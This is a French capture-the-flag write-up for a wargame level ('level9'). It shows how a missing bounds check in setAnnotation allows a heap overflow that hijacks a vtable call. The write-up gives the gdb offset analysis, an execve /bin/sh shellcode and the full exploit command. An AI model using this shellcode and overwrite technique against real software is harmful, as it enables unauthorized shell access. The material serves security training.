## Le programme
La fonction setAnnotation copie la chaine en parametre dans N->annotation, mais ne fait pas de bounds check.

Si on analyse le code machine, on voit que tout a la fin on appelle une fonction qui est dans le registre edx. En regardant d'ou edx tient sa valeur, on voit qu'elle est mov de eax, qui est elle meme une dereference de eax. Cette fonction est l'operator+ de b qu'on va chercher dans sa vtable.

## La faille
On peut faire crash le programme avec un buffer overrun. On voit que le crash arrive lorsqu'on bouge la valeur a l'adresse de eax dans edx:
```
(gdb) Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) disas main
...
=> 0x08048682 <+142>:	mov    (%eax),%edx
...
(gdb) info register eax
eax            0x41366441	1094083649
```
Cela nous donne un offset de 108.

## Le shellcode
On va utiliser un shellcode qu'on va mettre dans le buffer, ensuite on overwritera eax pour pointer dans le buffer. Il y a un niveau d'indirection (voir l'instruction mov (%eax), %eax), donc il faudra qu'on overwrite eax a l'offset 108 pour qu'il pointe au debut du buffer, et au debut du buffer ecrire une adresse qui pointera 4 bytes plus loin ou il y aura notre shellcode:

adresse du debut du buffer plus 4 bytes + shellcode + padding jusqu'a 108 bytes + adresse du debut du buffer

Avec ltrace on peut voir que l'adresse du buffer est 0x0804a00c:
```
level9@RainFall:~$ ltrace ./level9 aaaaaaaaaa
...
memcpy(0x0804a00c, "aaaaaaaaaa", 10)
```

**Notre shellcode (execve /bin/sh, 21 bytes):** \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

## Final
```
$> ./level9 `printf "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac\x0c\xa0\x04\x08"`
```
